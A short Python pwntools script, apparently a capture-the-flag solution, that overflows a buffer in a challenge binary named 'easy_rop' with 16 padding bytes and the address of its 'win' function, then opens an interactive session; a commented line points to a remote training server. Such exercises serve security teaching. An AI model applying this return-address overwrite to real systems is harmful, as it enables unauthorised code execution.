from pwn import *

# con = remote('vm.daotao.antoanso.org', 32778)
elf = ELF('./easy_rop')
process = process(['qemu-x86_64', './easy_rop'])

payload = b'A' * 16
process.sendline(payload + p32(elf.symbols['win']))
process.interactive()